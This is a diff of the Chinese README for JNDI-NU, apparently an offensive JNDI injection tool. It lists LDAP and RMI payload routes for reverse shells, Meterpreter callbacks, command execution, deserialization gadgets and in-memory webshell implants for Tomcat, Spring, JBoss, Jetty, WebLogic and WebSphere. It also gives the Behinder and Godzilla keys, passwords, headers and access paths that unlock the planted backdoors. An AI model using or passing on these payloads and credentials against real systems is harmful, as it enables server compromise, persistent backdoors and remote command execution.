@@ -14,7 +14,7 @@
 
 ## 👾下载
 
-[下载点此处](https://github.com/nuxl1r/JNDI-NU/releases)
+[下载点此处](https://github.com/nu1r/JNDI-NU/releases)
 
 ## 😈使用说明
 
@@ -33,7 +33,7 @@ Usage: java -jar JNDI-NU.jar [options]
     -h, --help     Show this help
 ```
 
-使用 ```java -jar JNDI-NU.jar.jar -u``` 查看支持的 LDAP 格式
+~~使用 ```java -jar JNDI-NU.jar.jar -u``` 查看支持的 LDAP 格式~~(取消该帮助信息，有需要在此处看即可)
 ```
 Supported LADP Queries：
 * all words are case INSENSITIVE when send to ldap server
@@ -46,17 +46,24 @@ Supported LADP Queries：
     ldap://0.0.0.0:1389/Basic/TomcatEcho
     ldap://0.0.0.0:1389/Basic/SpringEcho
     ldap://0.0.0.0:1389/Basic/WeblogicEcho
-    ldap://0.0.0.0:1389/Basic/TomcatMemshell1
-    ldap://0.0.0.0:1389/Basic/TomcatMemshell2  ---need extra header [shell: true]
-    ldap://0.0.0.0:1389/Basic/TomcatMemshell3  /ateam  pass1024
-    ldap://0.0.0.0:1389/Basic/GodzillaMemshell /bteam.ico pass1024
-    ldap://0.0.0.0:1389/Basic/JettyMemshell
+    ldap://0.0.0.0:1389/Basic/tomcatFilter
+    ldap://0.0.0.0:1389/Basic/tomcatFilterhead  ---need extra header [shell: true]
     ldap://0.0.0.0:1389/Basic/WeblogicMemshell1
     ldap://0.0.0.0:1389/Basic/WeblogicMemshell2
-    ldap://0.0.0.0:1389/Basic/JBossMemshell
+    ldap://0.0.0.0:1389/Basic/JBossFilter
+    ldap://0.0.0.0:1389/Basic/JBossServlet
+    ldap://0.0.0.0:1389/Basic/JettyFilter
+    ldap://0.0.0.0:1389/Basic/JettyServlet
+    ldap://0.0.0.0:1389/Basic/tomcatFilterJmx
+    ldap://0.0.0.0:1389/Basic/tomcatFilterTh
+    ldap://0.0.0.0:1389/Basic/TomcatListenerJmx
+    ldap://0.0.0.0:1389/Basic/TomcatListenerTh
+    ldap://0.0.0.0:1389/Basic/TomcatServletJmx
+    ldap://0.0.0.0:1389/Basic/TomcatServletTh
     ldap://0.0.0.0:1389/Basic/WebsphereMemshell
-    ldap://0.0.0.0:1389/Basic/SpringMemshell
-    rmi://0.0.0.0:1099/jilt123 -c [cmd]
+    ldap://0.0.0.0:1389/Basic/SpringInterceptor
+    ldap://0.0.0.0:1389/Basic/WSFilter
+    rmi://0.0.0.0:1099/Bypass
 
 [+] Deserialize Queries: ldap://0.0.0.0:1389/Deserialization/[GadgetType]/[PayloadType]/[Params], e.g.
     ldap://0.0.0.0:1389/Deserialization/URLDNS/[domain]
@@ -94,11 +101,19 @@ Supported LADP Queries：
     ldap://0.0.0.0:1389/TomcatBypass/ReverseShell/[ip]/[port]  ---windows NOT supported
     ldap://0.0.0.0:1389/TomcatBypass/TomcatEcho
     ldap://0.0.0.0:1389/TomcatBypass/SpringEcho
-    ldap://0.0.0.0:1389/TomcatBypass/TomcatMemshell1
-    ldap://0.0.0.0:1389/TomcatBypass/TomcatMemshell2  ---need extra header [shell: true]
-    ldap://0.0.0.0:1389/TomcatBypass/TomcatMemshell3  /ateam  pass1024
-    ldap://0.0.0.0:1389/TomcatBypass/GodzillaMemshell /bteam.ico pass1024
-    ldap://0.0.0.0:1389/TomcatBypass/SpringMemshell
+    ldap://0.0.0.0:1389/TomcatBypass/SpringInterceptor
+    ldap://0.0.0.0:1389/TomcatBypass/TomcatFilterJmx
+    ldap://0.0.0.0:1389/TomcatBypass/TomcatFilterTh
+    ldap://0.0.0.0:1389/TomcatBypass/TomcatListenerJmx
+    ldap://0.0.0.0:1389/TomcatBypass/TomcatListenerTh
+    ldap://0.0.0.0:1389/TomcatBypass/TomcatServletJmx
+    ldap://0.0.0.0:1389/TomcatBypass/TomcatServletTh
+    ldap://0.0.0.0:1389/TomcatBypass/JBossFilter
+    ldap://0.0.0.0:1389/TomcatBypass/JBossServlet
+    ldap://0.0.0.0:1389/TomcatBypass/WSFilter
+    ldap://0.0.0.0:1389/TomcatBypass/weblogicmemshell1
+    ldap://0.0.0.0:1389/TomcatBypass/weblogicmemshell2
+    ldap://0.0.0.0:1389/TomcatBypass/webspherememshell
     ldap://0.0.0.0:1389/TomcatBypass/Meterpreter/[ip]/[port]  ---java/meterpreter/reverse_tcp
 
 [+] GroovyBypass Queries
@@ -118,17 +133,35 @@ Supported LADP Queries：
   * ```Dnslog```: 用于产生一个```DNS```请求，与 ```DNSLog```平台配合使用，对```Linux/Windows```进行了简单的适配
   * ```Command```: 用于执行命令，如果命令有特殊字符，支持对命令进行 ```Base64编码```后传输
   * ```ReverseShell```: 用于 ```Linux``` 系统的反弹shell，方便使用
+  * ```Bypass```: 用于rmi命令执行，通过添加自定义```header``` ```cmd: whoami``` 的方式传递想要执行的命令
   * ```TomcatEcho```: 用于在中间件为 ```Tomcat``` 时命令执行结果的回显，通过添加自定义```header``` ```cmd: whoami``` 的方式传递想要执行的命令
   * ```SpringEcho```: 用于在框架为 ```SpringMVC/SpringBoot``` 时命令执行结果的回显，通过添加自定义```header``` ```cmd: whoami``` 的方式传递想要执行的命令
   * ```WeblogicEcho```: 用于在中间件为 ```Weblogic``` 时命令执行结果的回显，通过添加自定义```header``` ```cmd: whoami``` 的方式传递想要执行的命令
-  * ```TomcatMemshell1```: 用于植入```Tomcat内存shell```， 支持```Behinder shell``` 与 ```Basic cmd shell```
-  * ```TomcatMemshell2```: 用于植入```Tomcat内存shell```， 支持```Behinder shell``` 与 ```Basic cmd shell```, 使用时需要添加额外的```HTTP Header``` ```Shell: true```, **推荐**使用此方式
-  * ```SpringMemshell```: 用于植入```Spring内存shell```， 支持```Behinder shell``` 与 ```Basic cmd shell```
-  * ```WeblogicMemshell1```: 用于植入```Weblogic内存shell```， 支持```Behinder shell``` 与 ```Basic cmd shell```
-  * ```WeblogicMemshell2```: 用于植入```Weblogic内存shell```， 支持```Behinder shell``` 与 ```Basic cmd shell```，**推荐**使用此方式
-  * ```JettyMemshell```: 用于植入```Jetty内存shell```， 支持```Behinder shell``` 与 ```Basic cmd shell```
-  * ```JBossMemshell```: 用于植入```JBoss内存shell```， 支持```Behinder shell``` 与 ```Basic cmd shell```
-  * ```WebsphereMemshell```: 用于植入```Websphere内存shell```， 支持```Behinder shell``` 与 ```Basic cmd shell```
+* 内存马已适配冰蝎4.0,AES加密, 添加后访问```/nu1r```即可, 暂时只写了冰蝎4的shell,冰蝎4.0使用时，需要先设置key为 ```f90ec6fa47af4bda```
+  - 支持引用类远程加载方式打入（Basic路由）
+  - 支持本地工厂类方式打入 （TomcatBypass路由）
+    * ```tomcatFilter```: 通过类加载器获取指定上下文向系统内植入 Tomcat Filter 型内存马
+    * ```tomcatFilterhead```: 通过类加载器获取指定上下文向系统内植入 Tomcat Filter 型内存马, 使用时需要添加额外的```HTTP Header``` ```Shell: true```, **推荐**使用此方式
+    * ```SpringInterceptor```: 向系统内植入 Spring Interceptor 类型的内存马
+      * 前提条件：Referer: https://nu1r.cn/
+      * 冰蝎4.0使用时，需要先设置key为 ```f90ec6fa47af4bda```
+      * X-nu1r-TOKEN 如果为 ce 则执行命令 , ?X-Token-Data=cmd
+      * X-nu1r-TOKEN 如果为 bx 则为冰蝎马   密码 nu1ryyds
+      * X-nu1r-TOKEN 如果为 gz 则为哥斯拉马 pass nu1r key nu1ryyds 
+    * ```WeblogicMemshell1```: 用于植入```Weblogic内存shell```， 支持```Behinder shell``` 与 ```Basic cmd shell```
+    * ```WeblogicMemshell2```: 用于植入```Weblogic内存shell```， 支持```Behinder shell``` 与 ```Basic cmd shell```，**推荐**使用此方式
+    * ```JettyFilter```: 利用 JMX MBeans 向系统内植入 Jetty Filter 型内存马
+    * ```JettyServlet```: 利用 JMX MBeans 向系统内植入 Jetty Servlet 型内存马
+    * ```JBossFilter```: 通过全局上下文向系统内植入 JBoss/Wildfly Filter 型内存马
+    * ```JBossServlet```: 通过全局上下文向系统内植入 JBoss/Wildfly Servlet 型内存马
+    * ```WebsphereMemshell```: 用于植入```Websphere内存shell```， 支持```Behinder shell``` 与 ```Basic cmd shell```
+    * ```tomcatFilterJmx```: 利用 JMX MBeans 向系统内植入 Tomcat Filter 型内存马
+    * ```tomcatFilterTh```: 通过线程类加载器获取指定上下文向系统内植入 Tomcat Filter 型内存马
+    * ```TomcatListenerJmx```: 利用 JMX MBeans 向系统内植入 Tomcat Listener 型内存马
+    * ```TomcatListenerTh```: 通过线程类加载器获取指定上下文向系统内植入 Tomcat Listener 型内存马
+    * ```TomcatServletJmx```: 利用 JMX MBeans 向系统内植入 Tomcat Servlet 型内存马
+    * ```TomcatServletTh```: 通过线程类加载器获取指定上下文向系统内植入 Tomcat Servlet 型内存马
+    * ```WSFilter```: 通过线程类加载器获取指定上下文向系统内植入 WebSocket 内存马
 * 目前支持的所有 ```GadgetType``` 为
   * ```URLDNS```
   * ```CommonsBeanutils1```  
@@ -168,28 +201,10 @@ Supported LADP Queries：
 * 采用动态添加 ```Filter/Controller```的方式，并将添加的```Filter```移动至```FilterChain```的第一位
 * ```内存shell``` 的兼容性测试结果请参考 [memshell](https://github.com/feihong-cs/memShell) 项目
 * ```Basic cmd shell``` 的访问方式为 ```/anything?type=basic&pass=[cmd]```
-* ```TomcatMemshell1和TomcatMemshell2``` 的访问方式需要修改```冰蝎```客户端（请参考 [冰蝎改造之适配基于tomcat Filter的无文件webshell](https://mp.weixin.qq.com/s/n1wrjep4FVtBkOxLouAYfQ) 的方式二自行修改），并在访问时需要添加 ```X-Options-Ai``` 头部，密码为```rebeyond```
-## 🏀```内存shell```说明2
-* ```TomcatMemshell3``` 可直接使用冰蝎3客户端连接 推荐使用此payload
-* ```GodzillaMemshell``` 可直接使用哥斯拉客户端连接 推荐使用此payload
-## 🥋添加内容
+* ```tomcatFilter和tomcatFilterhead``` 的访问方式需要修改```冰蝎```客户端（请参考 [冰蝎改造之适配基于tomcat Filter的无文件webshell](https://mp.weixin.qq.com/s/n1wrjep4FVtBkOxLouAYfQ) 的方式二自行修改），并在访问时需要添加 ```X-Options-Ai``` 头部，密码为```rebeyond```
 
-新增哥斯拉内存马
 
-- 支持引用类远程加载方式打入（Basic路由）
-- 支持本地工厂类方式打入 （TomcatBypass路由）
-
-哥斯拉客户端配置：
-```
-密码：pass1024
-密钥：key
-有效载荷：JavaDynamicPayload
-加密器：JAVA_AES_BASE64
-```
-
-修复之前版本中的一些问题，冰蝎内存马现已直接可用冰蝎客户端直连
-
-**新增msf上线支持**
+**MSF上线支持**
 
 - 支持tomcatBypass路由直接上线msf：
 
